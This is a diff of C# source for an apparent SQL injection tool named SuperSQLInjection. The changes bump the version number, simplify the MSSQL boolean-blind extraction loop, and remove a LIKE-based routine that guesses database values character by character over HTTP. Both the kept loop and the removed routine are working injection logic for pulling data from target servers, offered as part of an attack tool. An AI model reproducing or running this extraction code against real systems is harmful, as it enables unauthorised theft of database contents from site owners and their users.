@@ -230,7 +230,7 @@ namespace SuperSQLInjection
             return sid;
         }
 
-        public static int version = 20181204;
+        public static int version = 20181205;
         public static string versionURL = "http://www.shack2.org/soft/getNewVersion?ENNAME=SSuperSQLInjection&NO=" + URLEncode.UrlEncode(getSid()) + "&VERSION=" + version;
         //检查更新
         public void checkUpdate()
@@ -1008,24 +1008,19 @@ namespace SuperSQLInjection
                 int len = getValueByStepUp(MSSQL.bool_length.Replace("{data}", vs[1]), 0, 10);
                 this.Invoke(new showLogDelegate(log), vs[0] + "长度为：" + len,LogLevel.info);
                 String value = "";
-                if (config.useLike)
+                //获取值
+                for (int i = 1; i <= len; i++)
                 {
-                    value= getLikeValue(vs[1]);
-                }
-                else {
-                    //获取值
-                    for (int i = 1; i <= len; i++)
-                    {
 
-                        //select UNICODE(substring(@@version,{index},1))
-                        //取值payload，替换对应下标值
-                        String unicode_data_payload = MSSQL.nocast_unicode_value.Replace("{index}", i + "").Replace("{data}", vs[1] + "");
-                        int unicode = getValue(MSSQL.bool_value.Replace("{data}", unicode_data_payload), 32, 126);
+                    //select UNICODE(substring(@@version,{index},1))
+                    //取值payload，替换对应下标值
+                    String unicode_data_payload = MSSQL.nocast_unicode_value.Replace("{index}", i + "").Replace("{data}", vs[1] + "");
+                    int unicode = getValue(MSSQL.bool_value.Replace("{data}", unicode_data_payload), 32, 126);
 
-                        value += Tools.unHexByUnicode(unicode, config.db_encoding);
-                        //设置值,这里由于是unicode值，需要转换 
-                    }
+                    value += Tools.unHexByUnicode(unicode, config.db_encoding);
+                    //设置值,这里由于是unicode值，需要转换 
                 }
+
                 this.Invoke(new showLogDelegate(log), vs[0] + "值为：" + value, LogLevel.info);
                 this.Invoke(new setVariableDelegate(setVariable), vs[0], value);
 
@@ -1793,44 +1788,7 @@ namespace SuperSQLInjection
             }
             return newpayload;
         }
-
-        static char[] ss = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9', '_'};
-
-
-
-        
-        /// <summary>
-        /// Like判断
-        /// </summary>
-        /// <param name="payLoadStr">获取数据Like paylaod</param>
-        /// <param name="start">开始值</param>
-        /// <param name="end">最大值</param>
-        /// <returns></returns>
-        public String getLikeValue(String payLoadStr)
-        {
-            int index = 0;
-            StringBuilder value = new StringBuilder();
-            String startStr = "";
-            while (index<ss.Length)
-            {
-
-                String payload = payLoadStr+ " like '" + startStr + ss[index]+"%'";
-                ServerInfo server = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
-                Boolean exists = Tools.isTrue(server, config.key, config.reverseKey, config.keyType);
-                if (exists)
-                {
-                    
-                    startStr += ss[index] + "";
-                    index = 0;
-                }
-                else {
-                    index++;
-                }
-                
-            }
-            return startStr;
-
-        }
+       
         /// <summary>
         /// 二分法判断
         /// </summary>
@@ -7722,10 +7680,6 @@ namespace SuperSQLInjection
             }
         }
 
-        private void bypass_chk_useLike_CheckedChanged(object sender, EventArgs e)
-        {
-            config.useLike = this.bypass_chk_useLike.Checked;
-        }
 
         private void tsmi_injectLog_clearAllLog_Click(object sender, EventArgs e)
         {
